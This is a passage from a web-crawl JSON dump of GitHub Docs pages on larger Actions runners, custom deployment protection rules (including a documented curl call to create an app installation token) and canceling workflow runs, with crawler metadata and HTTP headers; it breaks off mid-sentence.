`macos-14-xlarge` \\[latest\\], `macos-15-xlarge` \\[Public preview\\] |\n\n#### [Limitations for macOS larger runners](#limitations-for-macos-larger-runners)\n\n*   All actions provided by GitHub are compatible with arm64 GitHub-hosted runners. However, community actions may not be compatible with arm64 and need to be manually installed at runtime.\n*   Nested-virtualization and Metal Performance Shaders (MPS) are not supported due to the limitation of Apple's Virtualization Framework.\n*   Networking capabilities such as Azure private networking and assigning static IPs are not currently available for macOS larger runners.\n*   The arm64 macOS runners do not have a static UUID/UDID assigned to them because Apple does not support this feature. However, Intel MacOS runners are assigned a static UDID, specifically `4203018E-580F-C1B5-9525-B745CECA79EB`. If you are building and signing on the same host you plan to test the build on, you can sign with a [development provisioning profile](https://developer.apple.com/help/account/manage-profiles/create-a-development-provisioning-profile/). If you do require a static UDID, you can use Intel runners and add their UDID to your Apple Developer account.\n\n### [Additional features for larger runners](#additional-features-for-larger-runners)\n\nCompared to standard GitHub-hosted runners, larger runners have additional features, and their availability varies depending on the larger runner's operating system.\n\nThese features can enhance your CI/CD pipelines in the following ways.\n\n*   Assigning larger runners static IP addresses from a specific range enables you to use this range to configure a firewall allowlist. For more information, see [Networking for larger runners](#networking-for-larger-runners).\n*   Autoscaling enables larger runners to scale up to a maximum limit set by you, so your workflows can run concurrently. For more information, see [Autoscaling larger runners](#autoscaling-larger-runners).\n*   Runner groups allow you to control access to larger runners for your organizations, repositories, and workflows. For more information, see [Controlling access to larger runners](https://docs.github.com/en/actions/using-github-hosted-runners/controlling-access-to-larger-runners).\n\n### [Runner images](#runner-images)\n\nLarger runners run on virtual machines (VMs), and GitHub installs a virtual hard disk (VHD) on this machine during the VM creation process. You can choose from different VM images to install on your runners.\n\n**GitHub-owned images:** These images are maintained by GitHub and are available for Linux x64, Windows x64, and macOS (x64 and arm) runners. For more information on these images and a full list of included tools for each runner operating system, see the [GitHub Actions Runner Images](https://github.com/actions/runner-images) repository.\n\n**Partner Images:** Partner images are not managed by GitHub and are pulled from the Azure Marketplace. See below for resources on where to find more information and to report issues for partner images.\n\n*   [Base Windows 11 desktop image](https://azuremarketplace.microsoft.com/en-us/marketplace/apps/microsoftwindowsdesktop.windows-11?tab=Overview).\n*   [NVIDIA GPU-Optimized VMI](https://azuremarketplace.microsoft.com/en-us/marketplace/apps/nvidia.ngc_azure_17_11)\n*   [Data Science Virtual Machine - Windows 2019](https://azuremarketplace.microsoft.com/en-us/marketplace/apps/microsoft-dsvm.dsvm-win-2019?tab=overview).\n*   arm64 images: [`actions/partner-runner-images` repository](https://github.com/actions/partner-runner-images).\n\n### [Understanding billing](#understanding-billing)\n\nNote\n\nLarger runners are not eligible for the use of included minutes on private repositories. For both private and public repositories, when larger runners are in use, they will always be billed at the per-minute rate.\n\nCompared to standard GitHub-hosted runners, larger runners are billed differently. Larger runners are only billed at the per-minute rate for the amount of time workflows are executed on them. There is no cost associated with creating a larger runner that is not being used by a workflow. For more information, see [About billing for GitHub Actions](https://docs.github.com/en/billing/managing-billing-for-github-actions/about-billing-for-github-actions#per-minute-rates).\n\n## [Machine sizes for larger runners](#machine-sizes-for-larger-runners)\n\nYou can choose from several specifications for larger runners.\n\n### [Specifications for general larger runners](#specifications-for-general-larger-runners)\n\n| CPU | Memory (RAM) | Storage (SSD) | Architecture | Operating system (OS) |\n| --- | --- | --- | --- | --- |\n| 6   | 14 GB | 14 GB | arm64 | macOS |\n| 12  | 30 GB | 14 GB | x64 | macOS |\n| 2   | 8 GB | 75 GB | x64, arm64 | Ubuntu |\n| 4   | 16 GB | 150 GB | x64, arm64 | Ubuntu, Windows |\n| 8   | 32 GB | 300 GB | x64, arm64 | Ubuntu, Windows |\n| 16  | 64 GB | 600 GB | x64, arm64 | Ubuntu, Windows |\n| 32  | 128 GB | 1200 GB | x64, arm64 | Ubuntu, Windows |\n| 64  | 208 GB | 2040 GB | arm64 | Ubuntu, Windows |\n| 64  | 256 GB | 2040 GB | x64 | Ubuntu, Windows |\n| 96  | 384 GB | 2040 GB | x64 | Ubuntu, Windows |\n\nNote\n\nThe 4-vCPU Windows runner only works with the Windows Server 2025 or the Base Windows 11 Desktop image.\n\n### [Specifications for GPU larger runners](#specifications-for-gpu-larger-runners)\n\n| CPU | GPU | GPU card | Memory (RAM) | GPU memory (VRAM) | Storage (SSD) | Operating system (OS) |\n| --- | --- | --- | --- | --- | --- | --- |\n| 4   | 1   | Tesla T4 | 28 GB | 16 GB | 176 GB | Ubuntu, Windows |\n\n## [About runner groups](#about-runner-groups)\n\nNote\n\nOnly larger runners with Linux or Windows operating systems can be assigned to runner groups.\n\nRunner groups enable administrators to control access to runners at the organization and enterprise levels. With runner groups, you can collect sets of runners and create a security boundary around them. You can then decide which organizations or repositories are permitted to run jobs on those sets of machines. During the larger runner deployment process, the runner can be added to an existing group, otherwise it will join a default group. You can create a group by following the steps in [Controlling access to larger runners](https://docs.github.com/en/actions/using-github-hosted-runners/controlling-access-to-larger-runners).\n\n## [Architectural overview of larger runners](#architectural-overview-of-larger-runners)\n\nNote\n\nThis architecture diagram only applies to larger runners with Linux or Windows operating systems.\n\nLarger runners are managed at the organization level, where they are arranged into groups that can contain multiple instances of the runner. They can also be created at the enterprise level and shared with organizations in the hierarchy. Once you've created a group, you can then add a runner to the group and update your workflows to target either the group name or the label assigned to the larger runner. You can also control which repositories are permitted to send jobs to the group for processing. For more information about groups, see [Controlling access to larger runners](https://docs.github.com/en/actions/using-github-hosted-runners/controlling-access-to-larger-runners).\n\nIn the following diagram, a class of hosted runner named `ubuntu-20.04-16core` has been defined with customized hardware and operating system configuration.\n\n![Diagram showing a larger runner being used by a workflow because of the runner's label.](https://docs.github.com/assets/cb-127441/images/help/actions/hosted-runner.png)\n\n1.  Instances of this runner are automatically created and added to a group called `grp-ubuntu-20.04-16core`.\n2.  The runners have been assigned the label `ubuntu-20.04-16core`.\n3.  Workflow jobs use the `ubuntu-20.04-16core` label in their `runs-on` key to indicate the type of runner they need to execute the job.\n4.  GitHub Actions checks the runner group to see if your repository is authorized to send jobs to the runner.\n5.  The job runs on the next available instance of the `ubuntu-20.04-16core` runner.\n\n## [Autoscaling larger runners](#autoscaling-larger-runners)\n\nNote\n\nAutoscaling is only available for larger runners with Linux or Windows operating systems.\n\nLarger runners can automatically scale to suit your needs. You can provision machines to run a specified maximum number of jobs when jobs are submitted for processing. Each machine only handles one job at a time, so these settings effectively determine the number of jobs that can be run concurrently.\n\nYou can configure the maximum job concurrency, which allows you to control your costs by setting the maximum parallel number of jobs that can be run using this set. A higher value here can help avoid workflows being blocked due to parallelism. For more information on how to set limits, see [Managing larger runners](https://docs.github.com/en/actions/using-github-hosted-runners/managing-larger-runners#configuring-autoscaling-for-larger-runners). For more information on the maximum auto-scaling limits for GitHub-hosted runners, see [Usage limits, billing, and administration](https://docs.github.com/en/actions/learn-github-actions/usage-limits-billing-and-administration#usage-limits).\n\n## [Assigning static IP addresses to larger runners](#assigning-static-ip-addresses-to-larger-runners)\n\nYou can assign static IP addresses only to larger runners that use Linux or Windows operating systems.\n\nStatic IP addresses assigned are all usable and are not in CIDR notation.\n\nPrivate networking for GitHub-hosted runners does not support static IP addresses for larger runners. For more information about private networking for GitHub-hosted runners, see [About Azure private networking for GitHub-hosted runners in your enterprise](https://docs.github.com/en/enterprise-cloud@latest/admin/configuration/configuring-private-networking-for-hosted-compute-products/about-azure-private-networking-for-github-hosted-runners-in-your-enterprise).\n\n## [Networking for larger runners](#networking-for-larger-runners)\n\nBy default, larger runners receive a dynamic IP address that changes for each job run. Optionally, GitHub Enterprise Cloud customers can configure their larger runners to receive static IP addresses from GitHub's IP address pool. For more information, see [About GitHub's IP addresses](https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/about-githubs-ip-addresses).\n\nWhen enabled, instances of the larger runner will receive IP addresses from specific ranges that are unique to the runner, allowing you to use the ranges to configure a firewall allowlist. You can use up to 10 larger runners with static IP address ranges in total across all your larger runners. For more information, see [Managing larger runners](https://docs.github.com/en/actions/using-github-hosted-runners/managing-larger-runners#networking-for-larger-runners).\n\nIf you would like to use more than 10 larger runners with static IP address ranges, please contact us through the [GitHub Support portal](https://support.github.com/).\n\nNote\n\nIf runners are unused for more than 30 days, their IP address ranges are automatically removed and cannot be recovered.",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasMinWordsCrawleeHtmlToText",
    "totalLinks": 267,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-using-github-hosted-runners-using-larger-runners-about-larger-runners-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-using-github-hosted-runners-using-larger-runners-about-larger-runners-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-using-github-hosted-runners-using-larger-runners-about-larger-runners-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-using-github-hosted-runners-using-larger-runners-about-larger-runners-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-using-github-hosted-runners-using-larger-runners-about-larger-runners-readableTextIfPossibleHtmlUrl"
    },
    "lengths": {
      "extractus": 19694,
      "readableText": 17962,
      "none": 36060,
      "readableTextIfPossible": 17962,
      "result": 17962,
      "markdown": 14554
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-deployments/creating-custom-deployment-protection-rules",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-deployments/creating-custom-deployment-protection-rules",
    "loadedTime": "2025-05-08T06:38:38.412Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-deployments/creating-custom-deployment-protection-rules",
    "title": "Creating custom deployment protection rules - GitHub Docs",
    "description": "Use GitHub Apps to automate protecting deployments with third-party systems.",
    "author": null,
    "keywords": "Actions,CD,Deployment",
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Creating custom deployment protection rules - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/managing-workflow-runs-and-deployments/managing-deployments/creating-custom-deployment-protection-rules"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/managing-workflow-runs-and-deployments/managing-deployments/creating-custom-deployment-protection-rules"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "D6B0:112D68:F34401:13C26D0:681C5163",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:38:31 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21934-LGA",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686312.532438, VS0, VE252",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "27907",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Creating custom deployment protection rules\nUse GitHub Apps to automate protecting deployments with third-party systems.\nWho can use this feature?\nCustom deployment protection rules are available in public repositories for all plans. For access to custom deployment protection rules in private or internal repositories, you must use GitHub Enterprise. For more information, see GitHub’s plans.\nNote\nCustom deployment protection rules are currently in public preview and subject to change.\nAbout custom deployment protection rules\nYou can enable your own custom protection rules to gate deployments with third-party services. For example, you can use services such as Datadog, Honeycomb, and ServiceNow to provide automated approvals for deployments to GitHub.\nCustom deployment protection rules are powered by GitHub Apps and run based on webhooks and callbacks. Approval or rejection of a workflow job is based on consumption of the deployment_protection_rule webhook. For more information, see Webhook events and payloads and Approving or rejecting deployments.\nOnce you have created a custom deployment protection rule and installed it on your repository, the custom deployment protection rule will automatically be available for all environments in the repository.\nUsing custom deployment protection rules to approve or reject deployments\nDeployments to an environment can be approved or rejected based on the conditions defined in any external service like an approved ticket in an IT Service Management (ITSM) system, vulnerable scan result on dependencies, or stable health metrics of a cloud resource. The decision to approve or reject deployments is at the discretion of the integrating third-party application and the gating conditions you define in them. The following are a few use cases for which you can create a deployment protection rule.\nITSM & Security Operations: you can check for service readiness by validating quality, security, and compliance processes that verify deployment readiness.\nObservability systems: you can consult monitoring or observability systems (Asset Performance Management Systems and logging aggregators, cloud resource health verification systems, etc.) for verifying the safety and deployment readiness.\nCode quality & testing tools: you can check for automated tests on CI builds which need to be deployed to an environment.\nAlternatively, you can write your own protection rules for any of the above use cases or you can define any custom logic to safely approve or reject deployments from pre-production to production environments.\nCreating a custom deployment protection rule with GitHub Apps\nCreate a GitHub App. For more information, see Registering a GitHub App. Configure the GitHub App as follows.\nOptionally, in the Callback URL text field under \"Identifying and authorizing users,\" enter the callback URL. For more information, see About the user authorization callback URL.\nUnder \"Permissions,\" select Repository permissions.\nTo the right of \"Actions,\" click the drop down menu and select Access: Read-only. \nTo the right of \"Deployments,\" click the drop down menu and select Access: Read and write. \nUnder \"Subscribe to events,\" select Deployment protection rule. \nInstall the custom deployment protection rule in your repositories and enable it for use. For more information, see Configuring custom deployment protection rules.\nApproving or rejecting deployments\nOnce a workflow reaches a job that references an environment that has the custom deployment protection rule enabled, GitHub sends a POST request to a URL you configure containing the deployment_protection_rule payload. You can write your deployment protection rule to automatically send REST API requests that approve or reject the deployment based on the deployment_protection_rule payload. Configure your REST API requests as follows.\nValidate the incoming POST request. For more information, see Validating webhook deliveries.\nUse a JSON Web Token to authenticate as a GitHub App. For more information, see Authenticating as a GitHub App.\nUsing the installation ID from the deployment_protection_rule webhook payload, generate an install token. For more information, see About authentication with a GitHub App.\ncurl --request POST \\ --url \"https://api.github.com/app/installations/INSTALLATION_ID/ACCESS_TOKENS\" \\ --header \"Accept: application/vnd.github+json\" \\ --header \"Authorization: Bearer {jwt}\" \\ --header \"Content-Type: application/json\" \\ --data \\ '{ \\ \"repository_ids\": [321], \\ \"permissions\": { \\ \"deployments\": \"write\" \\ } \\ }' \nOptionally, to add a status report without taking any other action to GitHub, send a POST request to /repos/OWNER/REPO/actions/runs/RUN_ID/deployment_protection_rule. In the request body, omit the state. For more information, see REST API endpoints for workflow runs. You can post a status report on the same deployment up to 10 times. Status reports support Markdown formatting and can be up to 1024 characters long.\nTo approve or reject a request, send a POST request to /repos/OWNER/REPO/actions/runs/RUN_ID/deployment_protection_rule. In the request body, set the state property to either approved or rejected. For more information, see REST API endpoints for workflow runs.\nOptionally, request the status of an approval for a workflow run by sending a GET request to /repos/OWNER/REPOSITORY_ID/actions/runs/RUN_ID/approvals. For more information, see REST API endpoints for workflow runs.\nOptionally, review the deployment on GitHub. For more information, see Reviewing deployments.\nPublishing custom deployment protection rules in the GitHub Marketplace\nYou can publish your GitHub App to the GitHub Marketplace to allow developers to discover suitable protection rules and install it across their GitHub repositories. Or you can browse existing custom deployment protection rules to suit your needs. For more information, see About GitHub Marketplace for apps and Listing an app on GitHub Marketplace.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-deployments-creating-custom-deployment-protection-rules-7miyv.html",
  "markdown": "# Creating custom deployment protection rules\n\nUse GitHub Apps to automate protecting deployments with third-party systems.\n\n## Who can use this feature?\n\nCustom deployment protection rules are available in public repositories for all plans. For access to custom deployment protection rules in private or internal repositories, you must use GitHub Enterprise. For more information, see [GitHub’s plans](https://docs.github.com/en/get-started/learning-about-github/githubs-plans).\n\nNote\n\nCustom deployment protection rules are currently in public preview and subject to change.\n\n## [About custom deployment protection rules](#about-custom-deployment-protection-rules)\n\nYou can enable your own custom protection rules to gate deployments with third-party services. For example, you can use services such as Datadog, Honeycomb, and ServiceNow to provide automated approvals for deployments to GitHub.\n\nCustom deployment protection rules are powered by GitHub Apps and run based on webhooks and callbacks. Approval or rejection of a workflow job is based on consumption of the `deployment_protection_rule` webhook. For more information, see [Webhook events and payloads](https://docs.github.com/en/webhooks-and-events/webhooks/webhook-events-and-payloads#deployment_protection_rule) and [Approving or rejecting deployments](#approving-or-rejecting-deployments).\n\nOnce you have created a custom deployment protection rule and installed it on your repository, the custom deployment protection rule will automatically be available for all environments in the repository.\n\n## [Using custom deployment protection rules to approve or reject deployments](#using-custom-deployment-protection-rules-to-approve-or-reject-deployments)\n\nDeployments to an environment can be approved or rejected based on the conditions defined in any external service like an approved ticket in an IT Service Management (ITSM) system, vulnerable scan result on dependencies, or stable health metrics of a cloud resource. The decision to approve or reject deployments is at the discretion of the integrating third-party application and the gating conditions you define in them. The following are a few use cases for which you can create a deployment protection rule.\n\n*   ITSM & Security Operations: you can check for service readiness by validating quality, security, and compliance processes that verify deployment readiness.\n*   Observability systems: you can consult monitoring or observability systems (Asset Performance Management Systems and logging aggregators, cloud resource health verification systems, etc.) for verifying the safety and deployment readiness.\n*   Code quality & testing tools: you can check for automated tests on CI builds which need to be deployed to an environment.\n\nAlternatively, you can write your own protection rules for any of the above use cases or you can define any custom logic to safely approve or reject deployments from pre-production to production environments.\n\n## [Creating a custom deployment protection rule with GitHub Apps](#creating-a-custom-deployment-protection-rule-with-github-apps)\n\n1.  Create a GitHub App. For more information, see [Registering a GitHub App](https://docs.github.com/en/apps/creating-github-apps/creating-github-apps/creating-a-github-app). Configure the GitHub App as follows.\n    \n    1.  Optionally, in the **Callback URL** text field under \"Identifying and authorizing users,\" enter the callback URL. For more information, see [About the user authorization callback URL](https://docs.github.com/en/apps/creating-github-apps/creating-github-apps/about-the-user-authorization-callback-url).\n    2.  Under \"Permissions,\" select **Repository permissions**.\n    3.  To the right of \"Actions,\" click the drop down menu and select **Access: Read-only**.\n        \n        ![Screenshot of the \"Repository permissions\" section for a new GitHub App. The Actions permission shows \"Read-only\" and is outlined in orange.](https://docs.github.com/assets/cb-24396/images/help/actions/actions-repo-permissions-read-only.png)\n        \n    4.  To the right of \"Deployments,\" click the drop down menu and select **Access: Read and write**.\n        \n        ![Screenshot of the \"Repository permissions\" section for a new GitHub App. The Deployments permission shows \"Read and write\" and is outlined in orange.](https://docs.github.com/assets/cb-34606/images/help/actions/actions-deployments-repo-permissions-read-and-write.png)\n        \n    5.  Under \"Subscribe to events,\" select **Deployment protection rule**.\n        \n        ![Screenshot of the \"Subscribe to events section\" section for a new GitHub App. The checkbox for the Deployment protection rule is outlined in orange.](https://docs.github.com/assets/cb-49663/images/help/actions/actions-subscribe-to-events-deployment-protection-rules.png)\n        \n2.  Install the custom deployment protection rule in your repositories and enable it for use. For more information, see [Configuring custom deployment protection rules](https://docs.github.com/en/actions/deployment/protecting-deployments/configuring-custom-deployment-protection-rules).\n    \n\n## [Approving or rejecting deployments](#approving-or-rejecting-deployments)\n\nOnce a workflow reaches a job that references an environment that has the custom deployment protection rule enabled, GitHub sends a `POST` request to a URL you configure containing the `deployment_protection_rule` payload. You can write your deployment protection rule to automatically send REST API requests that approve or reject the deployment based on the `deployment_protection_rule` payload. Configure your REST API requests as follows.\n\n1.  Validate the incoming `POST` request. For more information, see [Validating webhook deliveries](https://docs.github.com/en/webhooks-and-events/webhooks/securing-your-webhooks#validating-payloads-from-github).\n    \n2.  Use a JSON Web Token to authenticate as a GitHub App. For more information, see [Authenticating as a GitHub App](https://docs.github.com/en/apps/creating-github-apps/authenticating-with-a-github-app/authenticating-as-a-github-app#about-authentication-as-a-github-app).\n    \n3.  Using the installation ID from the `deployment_protection_rule` webhook payload, generate an install token. For more information, see [About authentication with a GitHub App](https://docs.github.com/en/developers/apps/building-github-apps/authenticating-with-github-apps#authenticating-as-a-github-app).\n    \n    ```\n    curl --request POST \\\n    --url \"https://api.github.com/app/installations/INSTALLATION_ID/ACCESS_TOKENS\" \\\n    --header \"Accept: application/vnd.github+json\" \\\n    --header \"Authorization: Bearer {jwt}\" \\\n    --header \"Content-Type: application/json\" \\\n    --data \\\n    '{ \\\n       \"repository_ids\": [321], \\\n       \"permissions\": { \\\n          \"deployments\": \"write\" \\\n       } \\\n    }'\n    ```\n    \n4.  Optionally, to add a status report without taking any other action to GitHub, send a `POST` request to `/repos/OWNER/REPO/actions/runs/RUN_ID/deployment_protection_rule`. In the request body, omit the `state`. For more information, see [REST API endpoints for workflow runs](https://docs.github.com/en/rest/actions/workflow-runs#review-custom-deployment-protection-rules-for-a-workflow-run). You can post a status report on the same deployment up to 10 times. Status reports support Markdown formatting and can be up to 1024 characters long.\n    \n5.  To approve or reject a request, send a `POST` request to `/repos/OWNER/REPO/actions/runs/RUN_ID/deployment_protection_rule`. In the request body, set the `state` property to either `approved` or `rejected`. For more information, see [REST API endpoints for workflow runs](https://docs.github.com/en/rest/actions/workflow-runs#review-custom-deployment-protection-rules-for-a-workflow-run).\n    \n6.  Optionally, request the status of an approval for a workflow run by sending a `GET` request to `/repos/OWNER/REPOSITORY_ID/actions/runs/RUN_ID/approvals`. For more information, see [REST API endpoints for workflow runs](https://docs.github.com/en/rest/actions/workflow-runs#get-the-review-history-for-a-workflow-run).\n    \n7.  Optionally, review the deployment on GitHub. For more information, see [Reviewing deployments](https://docs.github.com/en/actions/managing-workflow-runs/reviewing-deployments).\n    \n\n## [Publishing custom deployment protection rules in the GitHub Marketplace](#publishing-custom-deployment-protection-rules-in-the-github-marketplace)\n\nYou can publish your GitHub App to the GitHub Marketplace to allow developers to discover suitable protection rules and install it across their GitHub repositories. Or you can browse existing custom deployment protection rules to suit your needs. For more information, see [About GitHub Marketplace for apps](https://docs.github.com/en/apps/publishing-apps-to-github-marketplace/github-marketplace-overview/about-github-marketplace) and [Listing an app on GitHub Marketplace](https://docs.github.com/en/apps/publishing-apps-to-github-marketplace/listing-an-app-on-github-marketplace).",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 252,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-deployments-creating-custom-deployment-protection-rules-originalHtm",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-deployments-creating-custom-deployment-protection-rules-removedElem",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-deployments-creating-custom-deployment-protection-rules-extractusHt",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-deployments-creating-custom-deployment-protection-rules-readableTex",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-deployments-creating-custom-deployment-protection-rules-readableTex"
    },
    "lengths": {
      "extractus": 11827,
      "readableText": 11023,
      "none": 31645,
      "readableTextIfPossible": 11023,
      "result": 11023,
      "markdown": 9072
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/canceling-a-workflow",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/canceling-a-workflow",
    "loadedTime": "2025-05-08T06:38:42.822Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/canceling-a-workflow",
    "title": "Canceling a workflow - GitHub Docs",
    "description": "You can cancel a workflow run that is in progress. When you cancel a workflow run, GitHub cancels all jobs and steps that are a part of that workflow.",
    "author": null,
    "keywords": null,
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Canceling a workflow - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/canceling-a-workflow"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/canceling-a-workflow"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "249A:205091:EE7760:1374B2F:681C516C",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:38:36 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21934-LGA",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686316.211493, VS0, VE296",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "25662",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Canceling a workflow - GitHub Docs\nYou can cancel a workflow run that is in progress. When you cancel a workflow run, GitHub cancels all jobs and steps that are a part of that workflow.\nIn this article\nWrite access to the repository is required to perform these steps.\nCanceling a workflow run\nOn GitHub, navigate to the main page of the repository.\nUnder your repository name, click Actions.\nIn the left sidebar, click the workflow you want to see.\nFrom the list of workflow runs, click the name of the queued or in progress run that you want to cancel.\nIn the upper-right corner of the workflow, click Cancel workflow. \nSteps GitHub takes to cancel a workflow run\nWhen canceling workflow run, you may be running other software that uses resources that are related to the workflow run. To help you free up resources related to the workflow run, it may help to understand the steps GitHub performs to cancel a workflow run.\nTo cancel the workflow run, the server re-evaluates if conditions for all currently running jobs. If the condition evaluates to true, the job will not get canceled. For example, the condition if: always() would evaluate to true and the job continues to run. When there is no condition, that is the equivalent of the condition if: success(), which only runs if the previous step finished successfully.\nFor jobs that need to be canceled, the server sends a cancellation message to all the runner machines with jobs that need to be canceled.\nFor jobs that continue to run, the server re-evaluates if conditions for the unfinished steps. If the condition evaluates to true, the step continues to run. You can use the cancelled expression to apply a status check of cancelled(). For more information see Evaluate expressions in workflows and actions.\nFor steps that need to be canceled, the runner machine sends SIGINT/Ctrl-C to the step's entry process (node for javascript action, docker for container action, and bash/cmd/pwd when using run in a step). If the process doesn't exit within 7500 ms, the runner will send SIGTERM/Ctrl-Break to the process, then wait for 2500 ms for the process to exit. If the process is still running, the runner kills the process tree.\nAfter the 5 minutes cancellation timeout 